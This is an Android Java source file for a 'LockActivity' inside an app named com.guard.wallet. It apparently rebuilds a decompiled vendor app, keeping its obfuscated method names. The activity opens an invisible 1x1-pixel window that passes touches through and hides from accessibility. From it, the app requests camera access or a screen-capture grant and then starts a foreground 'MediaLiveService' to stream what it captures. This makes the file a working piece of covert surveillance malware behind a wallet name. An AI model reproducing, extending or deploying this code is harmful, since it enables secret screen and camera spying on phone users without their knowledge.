package com.guard.wallet;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.guard.wallet.capture.ScreenCaptureManager;
import com.guard.wallet.service.MediaLiveService;

public class LockActivity extends Activity {
    private static volatile LockActivity instance;
    private boolean requestStarted;

    public static void a() {
        synchronized (LockActivity.class) {
            if (instance != null) {
                instance.finish();
            }
        }
    }

    /** vendor LockActivity.b() — 返回当前实例 */
    public static LockActivity b() {
        synchronized (LockActivity.class) {
            return instance;
        }
    }

    /** vendor c() — trigger camera capture via accessibility overlay */
    public void c() {
        try {
            if (ContextCompat.checkSelfPermission(this, "android.permission.CAMERA")
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{"android.permission.CAMERA"}, 1004);
                return;
            }
            com.guard.wallet.camera.CameraCaptureManager manager = com.guard.wallet.camera.CameraCaptureManager.c();
            manager.a.set(false);
            com.guard.wallet.camera.CameraInfo cameraInfo = manager.e;
            if (cameraInfo != null && cameraInfo.b >= 0) {
                manager.a(cameraInfo.b);
            }
        } catch (Exception ex) {
            AppUtils.s("LockActivity", ex);
            finish();
        }
    }

    /** vendor d() — trigger screen capture restart */
    public void d() {
        if (this.requestStarted) {
            return;
        }
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService("media_projection");
            if (mpm == null) {
                finish();
                return;
            }
            this.requestStarted = true;
            startActivityForResult(mpm.createScreenCaptureIntent(), 1003);
        } catch (Exception ex) {
            AppUtils.s("LockActivity", ex);
            this.requestStarted = false;
            finish();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        synchronized (LockActivity.class) {
            instance = this;
        }
        View view = new View(this);
        view.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO);
        setContentView(view);
        WindowManager.LayoutParams attrs = getWindow().getAttributes();
        attrs.dimAmount = 0.0f;
        attrs.x = 0;
        attrs.y = 0;
        attrs.width = 1;
        attrs.height = 1;
        attrs.gravity = 8388661;
        getWindow().setAttributes(attrs);
        getWindow().getDecorView().setBackgroundColor(0);
        getWindow().setFlags(1024, 1024);
        getWindow().addFlags(32);
        getWindow().addFlags(16);
        getWindow().addFlags(8);
    }

    @Override
    protected void onStart() {
        super.onStart();
        Intent intent = getIntent();
        if (intent != null && intent.getBooleanExtra("request_media_projection", false)) {
            d();
            return;
        }
        try {
            com.guard.wallet.camera.CameraCaptureManager manager = com.guard.wallet.camera.CameraCaptureManager.c();
            if (manager.a.get() && manager.e != null) {
                c();
            }
        } catch (Exception ex) {
            AppUtils.s("LockActivity", ex);
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        this.requestStarted = false;
    }

    @Override
    protected void onDestroy() {
        synchronized (LockActivity.class) {
            if (instance == this) {
                instance = null;
            }
        }
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != 1003) {
            return;
        }
        this.requestStarted = false;
        try {
            ScreenCaptureManager capture = ScreenCaptureManager.getInstance();
            capture.requesting.set(false);
            if (resultCode == -1 && Build.VERSION.SDK_INT >= 29) {
                startForegroundService(new Intent(this, MediaLiveService.class)
                        .putExtra("code", resultCode)
                        .putExtra("data", data));
            }
        } catch (Exception ex) {
            AppUtils.s("LockActivity", ex);
        }
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != 1004) {
            return;
        }
        try {
            com.guard.wallet.camera.CameraCaptureManager manager = com.guard.wallet.camera.CameraCaptureManager.c();
            manager.a.set(false);
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                com.guard.wallet.camera.CameraInfo cameraInfo = manager.e;
                if (cameraInfo != null && cameraInfo.b >= 0) {
                    manager.a(cameraInfo.b);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("LockActivity", ex);
        }
        finish();
    }
}
